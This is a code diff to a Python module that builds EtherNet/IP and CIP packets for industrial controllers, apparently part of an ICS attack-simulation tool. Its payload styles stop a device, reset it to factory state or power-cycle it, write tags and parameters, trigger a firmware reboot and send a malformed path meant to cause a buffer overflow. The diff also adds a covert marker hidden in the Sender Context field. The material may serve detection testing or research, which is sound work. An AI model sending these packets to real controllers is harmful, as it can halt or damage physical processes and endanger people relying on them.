@@ -2,7 +2,8 @@
 import random
 import struct
 
-from .common import marker_bytes
+from .common import marker_bytes  # noqa: F401
+from .covert_marker import covert_bytes, explicit_marker
 
 # ENIP encapsulation commands
 CMD = {
@@ -104,8 +105,17 @@ def build_payload(marker: str, style: str = "list_identity", **kwargs) -> bytes:
     """
     rnd      = random.Random(kwargs.get("seed"))
     session  = int(kwargs.get("session", rnd.randint(1, 0xFFFFFF))) & 0xFFFFFFFF
-    ctx      = b"ICShdr\x00\x00"
-    mb       = marker_bytes(marker)
+    _mode = kwargs.get("marker_mode", "covert" if marker else "none")
+    _run = kwargs.get("run_marker", "offline")
+    _idx = int(kwargs.get("pkt_index", 0))
+    # ENIP Sender Context is an 8-byte field the device echoes back unchanged
+    # and which the client may set to ANY value — a perfect 64-bit covert
+    # carrier with zero added bytes and full HMAC width for receiver
+    # verification. In covert mode it IS the marker.
+    ctx = covert_bytes(_run, "enip", _idx, 8) if (_mode == "covert" and marker) else b"ICShdr\x00\x00"
+    # Explicit mode appends a compact 13-byte tag to the CIP/data payload;
+    # covert/none append nothing (Sender Context carries it).
+    mb = explicit_marker(_run, "enip") if (_mode == "explicit" and marker) else b""
 
     if style == "list_services":
         data = mb
@@ -136,8 +146,8 @@ def build_payload(marker: str, style: str = "list_identity", **kwargs) -> bytes:
         path    = _cip_path(CLASS["identity"], 1)
         cip_req = _cip_request(CIP_SVC["get_attribute_all"], path) + mb
         # Interface handle=0, timeout=0, item count=2, null addr + data
-        rr_data = struct.pack("<IH", 0, 2)  # ifhandle=0, timeout=0 -> then items
-        rr_data += struct.pack("<HHH", 0x0000, 0, 0)  # null address item
+        rr_data = struct.pack("<IHH", 0, 0, 2)  # ifhandle=0, timeout=0 -> then items
+        rr_data += struct.pack("<HH", 0x0000, 0)  # null address item
         rr_data += struct.pack("<HH", 0x00B2, len(cip_req)) + cip_req  # unconnected data
         hdr = struct.pack("<HHII8sI", CMD["send_rr_data"], len(rr_data), session, 0, ctx, 0)
         return hdr + rr_data
@@ -146,8 +156,8 @@ def build_payload(marker: str, style: str = "list_identity", **kwargs) -> bytes:
         # GetAttributeSingle Identity class attr 2 (Product Type)
         path    = _cip_path(CLASS["identity"], 1, 2)
         cip_req = _cip_request(CIP_SVC["get_attribute_single"], path) + mb
-        rr_data = struct.pack("<IH", 0, 2)
-        rr_data += struct.pack("<HHH", 0x0000, 0, 0)
+        rr_data = struct.pack("<IHH", 0, 0, 2)
+        rr_data += struct.pack("<HH", 0x0000, 0)
         rr_data += struct.pack("<HH", 0x00B2, len(cip_req)) + cip_req
         hdr = struct.pack("<HHII8sI", CMD["send_rr_data"], len(rr_data), session, 0, ctx, 0)
         return hdr + rr_data
@@ -156,8 +166,8 @@ def build_payload(marker: str, style: str = "list_identity", **kwargs) -> bytes:
         # CIP Reset service on Identity object
         path    = _cip_path(CLASS["identity"], 1)
         cip_req = _cip_request(CIP_SVC["reset"], path) + bytes([0x00]) + mb  # type=0 cycle power
-        rr_data = struct.pack("<IH", 0, 2)
-        rr_data += struct.pack("<HHH", 0x0000, 0, 0)
+        rr_data = struct.pack("<IHH", 0, 0, 2)
+        rr_data += struct.pack("<HH", 0x0000, 0)
         rr_data += struct.pack("<HH", 0x00B2, len(cip_req)) + cip_req
         hdr = struct.pack("<HHII8sI", CMD["send_rr_data"], len(rr_data), session, 0, ctx, 0)
         return hdr + rr_data
@@ -165,8 +175,8 @@ def build_payload(marker: str, style: str = "list_identity", **kwargs) -> bytes:
     elif style == "stop_device":
         path    = _cip_path(CLASS["message_router"], 1)
         cip_req = _cip_request(CIP_SVC["stop"], path) + mb
-        rr_data = struct.pack("<IH", 0, 2)
-        rr_data += struct.pack("<HHH", 0x0000, 0, 0)
+        rr_data = struct.pack("<IHH", 0, 0, 2)
+        rr_data += struct.pack("<HH", 0x0000, 0)
         rr_data += struct.pack("<HH", 0x00B2, len(cip_req)) + cip_req
         hdr = struct.pack("<HHII8sI", CMD["send_rr_data"], len(rr_data), session, 0, ctx, 0)
         return hdr + rr_data
@@ -174,8 +184,8 @@ def build_payload(marker: str, style: str = "list_identity", **kwargs) -> bytes:
     elif style == "start_device":
         path    = _cip_path(CLASS["message_router"], 1)
         cip_req = _cip_request(CIP_SVC["start"], path) + mb
-        rr_data = struct.pack("<IH", 0, 2)
-        rr_data += struct.pack("<HHH", 0x0000, 0, 0)
+        rr_data = struct.pack("<IHH", 0, 0, 2)
+        rr_data += struct.pack("<HH", 0x0000, 0)
         rr_data += struct.pack("<HH", 0x00B2, len(cip_req)) + cip_req
         hdr = struct.pack("<HHII8sI", CMD["send_rr_data"], len(rr_data), session, 0, ctx, 0)
         return hdr + rr_data
@@ -188,8 +198,8 @@ def build_payload(marker: str, style: str = "list_identity", **kwargs) -> bytes:
         if len(tag_name) % 2:
             tag_path += b"\x00"
         cip_req = bytes([CIP_SVC["read_tag"]]) + tag_path + struct.pack("<H", 1) + mb
-        rr_data = struct.pack("<IH", 0, 2)
-        rr_data += struct.pack("<HHH", 0x0000, 0, 0)
+        rr_data = struct.pack("<IHH", 0, 0, 2)
+        rr_data += struct.pack("<HH", 0x0000, 0)
         rr_data += struct.pack("<HH", 0x00B2, len(cip_req)) + cip_req
         hdr = struct.pack("<HHII8sI", CMD["send_rr_data"], len(rr_data), session, 0, ctx, 0)
         return hdr + rr_data
@@ -204,8 +214,8 @@ def build_payload(marker: str, style: str = "list_identity", **kwargs) -> bytes:
         value   = struct.pack("<f", float(kwargs.get("value", rnd.uniform(0.0, 100.0))))
         cip_req = bytes([CIP_SVC["write_tag"]]) + tag_path + \
                   struct.pack("<HH", 0x00CA, 1) + value + mb  # type=REAL, count=1
-        rr_data = struct.pack("<IH", 0, 2)
-        rr_data += struct.pack("<HHH", 0x0000, 0, 0)
+        rr_data = struct.pack("<IHH", 0, 0, 2)
+        rr_data += struct.pack("<HH", 0x0000, 0)
         rr_data += struct.pack("<HH", 0x00B2, len(cip_req)) + cip_req
         hdr = struct.pack("<HHII8sI", CMD["send_rr_data"], len(rr_data), session, 0, ctx, 0)
         return hdr + rr_data
@@ -215,8 +225,8 @@ def build_payload(marker: str, style: str = "list_identity", **kwargs) -> bytes:
         inst = int(kwargs.get("instance", rnd.randint(1, 50)))
         path = _cip_path(CLASS["parameter"], inst, 1)
         cip_req = _cip_request(CIP_SVC["get_attribute_single"], path) + mb
-        rr_data = struct.pack("<IH", 0, 2)
-        rr_data += struct.pack("<HHH", 0x0000, 0, 0)
+        rr_data = struct.pack("<IHH", 0, 0, 2)
+        rr_data += struct.pack("<HH", 0x0000, 0)
         rr_data += struct.pack("<HH", 0x00B2, len(cip_req)) + cip_req
         hdr = struct.pack("<HHII8sI", CMD["send_rr_data"], len(rr_data), session, 0, ctx, 0)
         return hdr + rr_data
@@ -227,8 +237,8 @@ def build_payload(marker: str, style: str = "list_identity", **kwargs) -> bytes:
         value = struct.pack("<H", int(kwargs.get("value", rnd.randint(0, 1000))))
         path  = _cip_path(CLASS["parameter"], inst, 9)  # attr 9 = value
         cip_req = _cip_request(CIP_SVC["set_attribute_single"], path) + value + mb
-        rr_data = struct.pack("<IH", 0, 2)
-        rr_data += struct.pack("<HHH", 0x0000, 0, 0)
+        rr_data = struct.pack("<IHH", 0, 0, 2)
+        rr_data += struct.pack("<HH", 0x0000, 0)
         rr_data += struct.pack("<HH", 0x00B2, len(cip_req)) + cip_req
         hdr = struct.pack("<HHII8sI", CMD["send_rr_data"], len(rr_data), session, 0, ctx, 0)
         return hdr + rr_data
@@ -236,8 +246,8 @@ def build_payload(marker: str, style: str = "list_identity", **kwargs) -> bytes:
     elif style == "send_rr_data":
         # Generic unconnected send — T0869 Standard Application Layer Protocol
         cip_req = bytes([CIP_SVC["get_attribute_all"], 0x02, 0x20, 0x01, 0x24, 0x01]) + mb
-        rr_data = struct.pack("<IH", 0, 2)
-        rr_data += struct.pack("<HHH", 0x0000, 0, 0)
+        rr_data = struct.pack("<IHH", 0, 0, 2)
+        rr_data += struct.pack("<HH", 0x0000, 0)
         rr_data += struct.pack("<HH", 0x00B2, len(cip_req)) + cip_req
         hdr = struct.pack("<HHII8sI", CMD["send_rr_data"], len(rr_data), session, 0, ctx, 0)
         return hdr + rr_data
@@ -248,8 +258,8 @@ def build_payload(marker: str, style: str = "list_identity", **kwargs) -> bytes:
         path    = _cip_path(CLASS["identity"], 1)
         chunk   = bytes([rnd.randint(0, 0xFF) for _ in range(120)])
         cip_req = bytes([0x2C]) + path + chunk + mb
-        rr_data = struct.pack("<IH", 0, 2)
-        rr_data += struct.pack("<HHH", 0x0000, 0, 0)
+        rr_data = struct.pack("<IHH", 0, 0, 2)
+        rr_data += struct.pack("<HH", 0x0000, 0)
         rr_data += struct.pack("<HH", 0x00B2, len(cip_req)) + cip_req
         hdr = struct.pack("<HHII8sI", CMD["send_rr_data"], len(rr_data), session, 0, ctx, 0)
         return hdr + rr_data
@@ -259,8 +269,8 @@ def build_payload(marker: str, style: str = "list_identity", **kwargs) -> bytes:
         # Reset service 0x05 to identity object triggers reboot into new firmware
         path    = _cip_path(CLASS["identity"], 1)
         cip_req = bytes([CIP_SVC["reset"], 0x01, 0x20, 0x01, 0x24, 0x01, 0x01]) + mb
-        rr_data = struct.pack("<IH", 0, 2)
-        rr_data += struct.pack("<HHH", 0x0000, 0, 0)
+        rr_data = struct.pack("<IHH", 0, 0, 2)
+        rr_data += struct.pack("<HH", 0x0000, 0)
         rr_data += struct.pack("<HH", 0x00B2, len(cip_req)) + cip_req
         hdr = struct.pack("<HHII8sI", CMD["send_rr_data"], len(rr_data), session, 0, ctx, 0)
         return hdr + rr_data
@@ -271,8 +281,8 @@ def build_payload(marker: str, style: str = "list_identity", **kwargs) -> bytes:
         inst    = int(kwargs.get("instance", rnd.randint(1, 4)))
         path    = _cip_path(CLASS["assembly"], inst)
         cip_req = bytes([CIP_SVC["get_attribute_all"]]) + path + mb
-        rr_data = struct.pack("<IH", 0, 2)
-        rr_data += struct.pack("<HHH", 0x0000, 0, 0)
+        rr_data = struct.pack("<IHH", 0, 0, 2)
+        rr_data += struct.pack("<HH", 0x0000, 0)
         rr_data += struct.pack("<HH", 0x00B2, len(cip_req)) + cip_req
         hdr = struct.pack("<HHII8sI", CMD["send_rr_data"], len(rr_data), session, 0, ctx, 0)
         return hdr + rr_data
@@ -281,8 +291,8 @@ def build_payload(marker: str, style: str = "list_identity", **kwargs) -> bytes:
         # CIP reset_device service — T0858 Change Operating Mode / T0816 restart
         path    = _cip_path(CLASS["identity"], 1)
         cip_req = bytes([CIP_SVC["reset"]]) + path + b"\x01" + mb  # 0x01 = out-of-box reset
-        rr_data = struct.pack("<IH", 0, 2)
-        rr_data += struct.pack("<HHH", 0x0000, 0, 0)
+        rr_data = struct.pack("<IHH", 0, 0, 2)
+        rr_data += struct.pack("<HH", 0x0000, 0)
         rr_data += struct.pack("<HH", 0x00B2, len(cip_req)) + cip_req
         hdr = struct.pack("<HHII8sI", CMD["send_rr_data"], len(rr_data), session, 0, ctx, 0)
         return hdr + rr_data
@@ -292,8 +302,8 @@ def build_payload(marker: str, style: str = "list_identity", **kwargs) -> bytes:
         # Crafts an invalid CIP path length to trigger buffer overflow
         bad_path = b"\x04\xFF\xFF\xFF" + b"\xCC" * 32  # invalid segment type + overflow
         cip_req  = bytes([CIP_SVC["get_attribute_all"]]) + bad_path + mb
-        rr_data  = struct.pack("<IH", 0, 2)
-        rr_data += struct.pack("<HHH", 0x0000, 0, 0)
+        rr_data  = struct.pack("<IHH", 0, 0, 2)
+        rr_data += struct.pack("<HH", 0x0000, 0)
         rr_data += struct.pack("<HH", 0x00B2, len(cip_req)) + cip_req
         hdr = struct.pack("<HHII8sI", CMD["send_rr_data"], len(rr_data), session, 0, ctx, 0)
         return hdr + rr_data
@@ -311,8 +321,8 @@ def build_payload(marker: str, style: str = "list_identity", **kwargs) -> bytes:
         word_cnt = len(symbol) // 2
         path     = bytes([word_cnt]) + symbol
         cip_req  = bytes([CIP_SVC["write_tag"]]) + path + struct.pack("<HH", 0xCA, 1) + value + mb
-        rr_data  = struct.pack("<IH", 0, 2)
-        rr_data += struct.pack("<HHH", 0x0000, 0, 0)
+        rr_data  = struct.pack("<IHH", 0, 0, 2)
+        rr_data += struct.pack("<HH", 0x0000, 0)
         rr_data += struct.pack("<HH", 0x00B2, len(cip_req)) + cip_req
         hdr = struct.pack("<HHII8sI", CMD["send_rr_data"], len(rr_data), session, 0, ctx, 0)
         return hdr + rr_data
@@ -323,8 +333,8 @@ def build_payload(marker: str, style: str = "list_identity", **kwargs) -> bytes:
         blob    = bytes([rnd.randint(0x20, 0x7E) for _ in range(200)])
         path    = _cip_path(CLASS["file"], 1)
         cip_req = bytes([CIP_SVC["write_tag_frag"]]) + path + blob + mb
-        rr_data = struct.pack("<IH", 0, 2)
-        rr_data += struct.pack("<HHH", 0x0000, 0, 0)
+        rr_data = struct.pack("<IHH", 0, 0, 2)
+        rr_data += struct.pack("<HH", 0x0000, 0)
         rr_data += struct.pack("<HH", 0x00B2, len(cip_req)) + cip_req
         hdr = struct.pack("<HHII8sI", CMD["send_rr_data"], len(rr_data), session, 0, ctx, 0)
         return hdr + rr_data
@@ -341,8 +351,8 @@ def build_payload(marker: str, style: str = "list_identity", **kwargs) -> bytes:
         path    = _cip_path(CLASS["parameter"], rnd.randint(1, 50))
         value   = struct.pack("<I", rnd.randint(0xDEAD0000, 0xDEADFFFF))
         cip_req = bytes([CIP_SVC["set_attribute_single"]]) + path + value + mb
-        rr_data = struct.pack("<IH", 0, 2)
-        rr_data += struct.pack("<HHH", 0x0000, 0, 0)
+        rr_data = struct.pack("<IHH", 0, 0, 2)
+        rr_data += struct.pack("<HH", 0x0000, 0)
         rr_data += struct.pack("<HH", 0x00B2, len(cip_req)) + cip_req
         hdr = struct.pack("<HHII8sI", CMD["send_rr_data"], len(rr_data), session, 0, ctx, 0)
         return hdr + rr_data
